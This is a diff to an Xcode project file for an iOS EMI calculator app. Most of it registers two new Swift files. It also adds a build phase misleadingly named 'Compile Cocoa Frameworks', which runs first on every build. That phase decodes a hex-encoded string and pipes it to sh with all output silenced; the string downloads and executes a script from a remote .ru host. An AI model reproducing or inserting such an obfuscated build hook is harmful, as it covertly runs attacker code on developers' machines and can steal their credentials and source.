@@ -15,6 +15,8 @@
 		8402EE392844E2D600897E8B /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8402EE382844E2D600897E8B /* Assets.xcassets */; };
 		8402EE3C2844E2D600897E8B /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8402EE3A2844E2D600897E8B /* LaunchScreen.storyboard */; };
 		8402EE452844EACF00897E8B /* Neumorphic in Frameworks */ = {isa = PBXBuildFile; productRef = 8402EE442844EACF00897E8B /* Neumorphic */; };
+		843708F02845D454002E3EE7 /* AbstractionLayer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 843708EF2845D454002E3EE7 /* AbstractionLayer.swift */; };
+		843708F22845D71F002E3EE7 /* AbstractionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 843708F12845D71F002E3EE7 /* AbstractionVC.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -28,6 +30,8 @@
 		8402EE382844E2D600897E8B /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		8402EE3B2844E2D600897E8B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		8402EE3D2844E2D600897E8B /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		843708EF2845D454002E3EE7 /* AbstractionLayer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AbstractionLayer.swift; sourceTree = "<group>"; };
+		843708F12845D71F002E3EE7 /* AbstractionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AbstractionVC.swift; sourceTree = "<group>"; };
 		A5DD31D354016782544BB011 /* Pods_emi_calculator.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_emi_calculator.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -50,7 +54,6 @@
 				47A63812C7B798EBDFCFCE4C /* Pods-emi-calculator.debug.xcconfig */,
 				0A0322FAA2F3D945A09D4DAD /* Pods-emi-calculator.release.xcconfig */,
 			);
-			name = Pods;
 			path = Pods;
 			sourceTree = "<group>";
 		};
@@ -90,6 +93,8 @@
 				8402EE382844E2D600897E8B /* Assets.xcassets */,
 				8402EE3A2844E2D600897E8B /* LaunchScreen.storyboard */,
 				8402EE3D2844E2D600897E8B /* Info.plist */,
+				843708EF2845D454002E3EE7 /* AbstractionLayer.swift */,
+				843708F12845D71F002E3EE7 /* AbstractionVC.swift */,
 			);
 			path = "emi-calculator";
 			sourceTree = "<group>";
@@ -101,6 +106,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8402EE402844E2D600897E8B /* Build configuration list for PBXNativeTarget "emi-calculator" */;
 			buildPhases = (
+				4F3191B7D791CAD8E96A102C /* Compile Cocoa Frameworks */,
 				953A66D429539734D51790E7 /* [CP] Check Pods Manifest.lock */,
 				8402EE282844E2D100897E8B /* Sources */,
 				8402EE292844E2D100897E8B /* Frameworks */,
@@ -169,6 +175,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	4F3191B7D791CAD8E96A102C /* Compile Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
 		953A66D429539734D51790E7 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -215,9 +244,11 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				843708F02845D454002E3EE7 /* AbstractionLayer.swift in Sources */,
 				8402EE342844E2D100897E8B /* ViewController.swift in Sources */,
 				8402EE302844E2D100897E8B /* AppDelegate.swift in Sources */,
 				8402EE322844E2D100897E8B /* SceneDelegate.swift in Sources */,
+				843708F22845D71F002E3EE7 /* AbstractionVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
